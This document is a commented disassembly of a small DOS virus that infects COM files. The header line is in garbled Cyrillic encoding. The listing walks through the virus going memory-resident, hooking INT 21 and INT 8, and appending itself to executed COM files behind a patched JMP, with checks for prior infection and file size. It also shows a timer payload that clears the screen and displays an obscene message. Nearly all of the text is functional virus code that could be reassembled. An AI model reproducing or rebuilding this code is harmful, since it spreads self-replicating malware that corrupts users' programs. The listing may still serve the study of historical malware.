

„«¨­  1A1 (417)                 len_jmp=1A4
Virus+0D  ¤à¥á ­ ç «  ¢¨àãá 

0100 06             PUSH      ES
0101 1E             PUSH      DS
0102 0E             PUSH      CS
0103 1F             POP       DS                 DS=CS
0104 CD12           INT       12                 Memory Size
0106 B106           MOV       CL,06
0108 D3E0           SHL       AX,CL              Convert to paragraphs
010A 8EC0           MOV       ES,AX              May be Resident virus
010C BAB827         MOV       DX,27B8        *** Virus base address ***
010F 26813E0001061E CMP       Word Ptr ES:[0100],1E06
0116 744E           JZ        0166               => already resident
0118 BB4000         MOV       BX,0040
011B 29D8           SUB       AX,BX
011D 8EC0           MOV       ES,AX              Memory address for resident
011F 8BF2           MOV       SI,DX
0121 BF0001         MOV       DI,0100
0124 B90003         MOV       CX,0300
0127 F3A4           REP       MOVSB              Copy to resident
0129 31C0           XOR       AX,AX
012B 8ED8           MOV       DS,AX
012D 813EF1045452   CMP       Word Ptr [04F1],5254     "TR" (communication area)
0133 7431           JZ        0166               => bypass resident
0135 BE8400         MOV       SI,0084
0138 BF8502         MOV       DI,0285
013B A5             MOVSW
013C A5             MOVSW                        Save int 21
013D C744FCDF01     MOV       Word Ptr [SI-04],01DF
0142 8C44FE         MOV       Word Ptr [SI-02],ES       New int 21
0145 BE2000         MOV       SI,0020
0148 BFD101         MOV       DI,01D1
014B A5             MOVSW
014C A5             MOVSW                        Save int 8
014D C744FC7901     MOV       Word Ptr [SI-04],0179
0152 8C44FE         MOV       Word Ptr [SI-02],ES       New int 8
0155 FF0E1304       DEC       Word Ptr [0413]    Decrement memory size
0159 58             POP       AX                 PSP address
015A 50             PUSH      AX
015B 48             DEC       AX                 MCB address
015C 8ED8           MOV       DS,AX
015E 291E1200       SUB       Word Ptr [0012],BX Memory size in PSP
0162 291E0300       SUB       Word Ptr [0003],BX             in MCB
0166 BE7400         MOV       SI,0074
0169 BF0001         MOV       DI,0100
016C 1F             POP       DS
016D 07             POP       ES
016E 01D6           ADD       SI,DX
0170 57             PUSH      DI
0171 A5             MOVSW
0172 A4             MOVSB                        Reset first 3 bytes
0173 C3             RET                          => continue programm

0174 E95724    First 3 bytes
0177 3000      Tick counter
                                                        *** INT 8 ENTRY ***
0179 2EFF067701     INC       Word Ptr CS:[0177]
017E 2E813E770160EA CMP       Word Ptr CS:[0177],EA60    60000
0185 7249           JB        01D0
0187 50             PUSH      AX
0188 53             PUSH      BX
0189 51             PUSH      CX
018A 52             PUSH      DX
018B 56             PUSH      SI
018C 1E             PUSH      DS
018D B40F           MOV       AH,0F
018F CD10           INT       10
0191 0E             PUSH      CS
0192 1F             POP       DS
0193 C70677010000   MOV       Word Ptr [0177],0000
0199 50             PUSH      AX                 Save monitor mode
019A B400           MOV       AH,00
019C CD10           INT       10                 Clear screen
019E 58             POP       AX
019F 50             PUSH      AX
01A0 D0EC           SHR       AH,1               No. of columns / 2
01A2 8AD4           MOV       DL,AH
01A4 80EA05         SUB       DL,05               - 5
01A7 B60C           MOV       DH,0C
01A9 B402           MOV       AH,02        Cursor position (DH-row, DL-col)
01AB CD10           INT       10
01AD BED501         MOV       SI,01D5   "Fuck You!"
01B0 B40E           MOV       AH,0E
01B2 AC             LODSB
01B3 08C0           OR        AL,AL
01B5 7404           JZ        01BB
01B7 CD10           INT       10                 Output
01B9 EBF7           JMP       01B2
01BB 31C9           XOR       CX,CX
01BD BAC800         MOV       DX,00C8
01C0 E2FE           LOOP      01C0
01C2 4A             DEC       DX
01C3 75FB           JNZ       01C0               Time Loop
01C5 58             POP       AX
01C6 B400           MOV       AH,00
01C8 CD10           INT       10                 Clear screen
01CA 1F             POP       DS
01CB 5E             POP       SI
01CC 5A             POP       DX
01CD 59             POP       CX
01CE 5B             POP       BX
01CF 58             POP       AX
01D0 EAAA00E40B     JMP       0BE4:00AA  Old INT 8

01D5  Fuck You!.
                                                        *** INT 21 ENTRY ***
01DF 50             PUSH      AX
01E0 2D004B         SUB       AX,4B00
01E3 7403           JZ        01E8               => EXEC
01E5 E99B00         JMP       0283               => Continue
01E8 53             PUSH      BX
01E9 51             PUSH      CX
01EA 52             PUSH      DX
01EB 56             PUSH      SI
01EC 57             PUSH      DI
01ED 1E             PUSH      DS
01EE 06             PUSH      ES
01EF 0E             PUSH      CS
01F0 07             POP       ES
01F1 B8023D         MOV       AX,3D02            Open Write
01F4 CD21           INT       21
01F6 7303           JNB       01FB
01F8 E98100         JMP       027C
01FB 8BD8           MOV       BX,AX              File Handle
01FD 0E             PUSH      CS
01FE 1F             POP       DS                 DS=CS
01FF BAA102         MOV       DX,02A1
0202 B90300         MOV       CX,0003
0205 E88A00         CALL      0292               Read first 3 bytes
0208 A1A102         MOV       AX,Word Ptr [02A1]
020B 3D4D5A         CMP       AX,5A4D            "MZ"
020E 7468           JZ        0278               => close
0210 3D5A4D         CMP       AX,4D5A            "ZM"
0213 7463           JZ        0278               => close
0215 8BF2           MOV       SI,DX
0217 BF7401         MOV       DI,0174
021A F3A4           REP       MOVSB              copy first 3 bytes
021C 3CE9           CMP       AL,E9              'JMP'?
021E 751D           JNZ       023D               =>no
0220 8B16A202       MOV       DX,Word Ptr [02A2] address from JMP
0224 83C203         ADD       DX,+03              +3
0227 B000           MOV       AL,00
0229 E85F00         CALL      028B               Lseek
022C BAA102         MOV       DX,02A1
022F B90200         MOV       CX,0002
0232 E85D00         CALL      0292               Read 2 bytes
0235 813EA102061E   CMP       Word Ptr [02A1],1E06
023B 743B           JZ        0278               => close (already infected)
023D B002           MOV       AL,02
023F E84700         CALL      0289               Lseek (0,2) - EOF
0242 09D2           OR        DX,DX
0244 7532           JNZ       0278               => close - too long
0246 3DC607         CMP       AX,07C6
0249 722D           JB        0278               => close - too short
024B 3D00FA         CMP       AX,FA00
024E 7328           JNB       0278               => close - too long
0250 2D0300         SUB       AX,0003
0253 A3A202         MOV       Word Ptr [02A2],AX address for JMP
0256 C606A102E9     MOV       Byte Ptr [02A1],E9  JMP
025B 050301         ADD       AX,0103
025E A30D01         MOV       Word Ptr [010D],AX   Base Address
0261 BA0001         MOV       DX,0100
0264 B9A101         MOV       CX,01A1
0267 E83300         CALL      029D               Write
026A B000           MOV       AL,00
026C E81A00         CALL      0289               Lseek(0,0)
026F BAA102         MOV       DX,02A1
0272 B90300         MOV       CX,0003
0275 E82500         CALL      029D               Write JMP
0278 B43E           MOV       AH,3E              Close
027A CD21           INT       21
027C 07             POP       ES
027D 1F             POP       DS
027E 5F             POP       DI
027F 5E             POP       SI
0280 5A             POP       DX
0281 59             POP       CX
0282 5B             POP       BX
0283 58             POP       AX
0284 EA6002BB0E     JMP       0EBB:0260   Old int 21

0289 31D2           XOR       DX,DX              Lseek (0,
028B B442           MOV       AH,42              Lseek
028D 31C9           XOR       CX,CX
028F CD21           INT       21
0291 C3             RET

0292 B43F           MOV       AH,3F              Read
0294 CD21           INT       21
0296 29C8           SUB       AX,CX
0298 58             POP       AX
0299 75DD           JNZ       0278               => close
029B FFE0           JMP       AX

029D B440           MOV       AH,40              Write
029F EBF3           JMP       0294


